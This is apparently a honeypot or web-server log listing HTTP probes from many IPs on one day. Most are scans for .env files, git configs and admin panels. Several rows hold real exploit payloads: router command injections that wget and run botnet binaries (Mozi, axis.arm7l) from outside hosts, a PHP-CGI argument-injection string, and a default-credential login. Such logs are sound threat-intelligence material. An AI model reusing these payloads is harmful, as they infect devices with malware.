"2025-08-16","141.98.11.44","Lithuania","HTTP","/device.rsp?opt=sys\u0026cmd=___S_O_S_T_R_E_A_MAX___\u0026mdb=sos\u0026mdc=cd%20%2Ftmp%3Brm%20axis.arm7l%3B%20wget%20http%3A%2F%2F198.251.89.190%2Faxe%2Faxis.arm7l%3B%20chmod%20%2Bx%20axis.arm7l%3B%20.%2Faxis.arm7l%20tbk"
"2025-08-16","79.124.58.198","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","78.153.140.203","United Kingdom","HTTP","/.env"
"2025-08-16","78.153.140.203","United Kingdom","HTTP","/api/.env"
"2025-08-16","78.153.140.203","United Kingdom","HTTP","/backend/.env"
"2025-08-16","78.153.140.203","United Kingdom","HTTP","/admin/.env"
"2025-08-16","78.153.140.203","United Kingdom","HTTP","/.env.example"
"2025-08-16","78.153.140.203","United Kingdom","HTTP","/app_dev.php/_profiler/phpinfo"
"2025-08-16","78.153.140.203","United Kingdom","HTTP","/?phpinfo=-1"
"2025-08-16","91.231.89.106","France","HTTP","/favicon.ico"
"2025-08-16","196.251.114.43","The Netherlands","HTTP","/.env"
"2025-08-16","167.99.248.146","Germany","HTTP","/form.html"
"2025-08-16","167.99.248.146","Germany","HTTP","/upl.php"
"2025-08-16","167.99.248.146","Germany","HTTP","/t4"
"2025-08-16","167.99.248.146","Germany","HTTP","/geoip/"
"2025-08-16","167.99.248.146","Germany","HTTP","/favicon.ico"
"2025-08-16","167.99.248.146","Germany","HTTP","/1.php"
"2025-08-16","167.99.248.146","Germany","HTTP","/systembc/password.php"
"2025-08-16","167.99.248.146","Germany","HTTP","/password.php"
"2025-08-16","196.251.118.190","The Netherlands","HTTP","/.env"
"2025-08-16","141.98.11.44","Lithuania","HTTP","/device.rsp?opt=sys\u0026cmd=___S_O_S_T_R_E_A_MAX___\u0026mdb=sos\u0026mdc=cd%20%2Ftmp%3Brm%20axis.arm7l%3B%20wget%20http%3A%2F%2F198.251.89.190%2Faxe%2Faxis.arm7l%3B%20chmod%20%2Bx%20axis.arm7l%3B%20.%2Faxis.arm7l%20tbk"
"2025-08-16","185.244.104.2","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","135.237.123.254","United States","HTTP","/developmentserver/metadatauploader"
"2025-08-16","184.105.247.254","United States","HTTP","http://api.ipify.org/?format=json"
"2025-08-16","184.105.247.254","United States","HTTP","/geoserver/web/"
"2025-08-16","120.85.112.127","China","HTTP","/GponForm/diag_Form?images/"
"2025-08-16","195.184.76.9","United States","HTTP","/favicon.ico"
"2025-08-16","204.76.203.193","The Netherlands","HTTP","http://ip-api.com/json/"
"2025-08-16","196.251.115.147","The Netherlands","HTTP","/.env"
"2025-08-16","45.204.194.225","Hong Kong","HTTP","/index.php"
"2025-08-16","45.204.194.225","Hong Kong","HTTP","/phpmyadmin/index.php"
"2025-08-16","45.86.86.143","Moldova","HTTP","/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
"2025-08-16","120.28.252.128","Philippines","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=rm+-rf+/tmp/*;wget+http://120.28.252.128:35237/Mozi.m+-O+/tmp/netgear;sh+netgear\u0026curpath=/\u0026currentsetting.htm=1"
"2025-08-16","206.168.34.46","United States","HTTP","/favicon.ico"
"2025-08-16","206.168.34.46","United States","HTTP","/favicon.ico"
"2025-08-16","206.168.34.46","United States","HTTP","/.well-known/security.txt"
"2025-08-16","106.75.87.37","China","HTTP","/version"
"2025-08-16","106.75.87.37","China","HTTP","/v1"
"2025-08-16","106.75.30.116","China","HTTP","/v1/vector/collections/describe"
"2025-08-16","106.75.30.116","China","HTTP","/v1"
"2025-08-16","196.251.83.214","Seychelles","HTTP","/.env"
"2025-08-16","45.86.86.143","Moldova","HTTP","/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
"2025-08-16","45.86.86.143","Moldova","HTTP","/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
"2025-08-16","141.98.10.21","Lithuania","HTTP","/setup.cgi?next_file=netgear.cfg\u0026todo=syscmd\u0026cmd=cd+/tmp;rm+-rf+*;wget+http://66.63.187.141/netg;chmod+777+netg;sh+netg+netgear;\u0026curpath=/\u0026currentsetting.htm=1;"
"2025-08-16","170.64.169.38","Australia","HTTP","/.git/config"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","42.92.121.144","China","HTTP","/favicon.ico"
"2025-08-16","195.170.172.128","Spain","HTTP","/WuEL"
"2025-08-16","195.170.172.128","Spain","HTTP","/a"
"2025-08-16","195.170.172.128","Spain","HTTP","/download/file.ext"
"2025-08-16","195.170.172.128","Spain","HTTP","/SiteLoader"
"2025-08-16","195.170.172.128","Spain","HTTP","/mPlayer"
"2025-08-16","149.50.96.5","Poland","HTTP","/userRpmNatDebugRpm26525557/start_art.html"
"2025-08-16","213.209.150.207","Germany","HTTP","/systembc/"
"2025-08-16","20.163.2.188","United States","HTTP","/ReportServer"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","213.209.150.207","Germany","HTTP","/systembc/"
"2025-08-16","159.65.110.29","United States","HTTP","/.env"
"2025-08-16","159.65.110.29","United States","HTTP","/.git/config"
"2025-08-16","20.65.193.127","United States","HTTP","/druid/index.html"
"2025-08-16","206.168.34.70","United States","HTTP","/favicon.ico"
"2025-08-16","206.168.34.70","United States","HTTP","/sitemap.xml"
"2025-08-16","178.141.142.17","Russia","HTTP","/boaform/admin/formLogin?username=adminisp\u0026psd=adminisp"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-08-16","95.214.52.169","Poland","HTTP","/cgi-bin/luci/;stok=/locale"
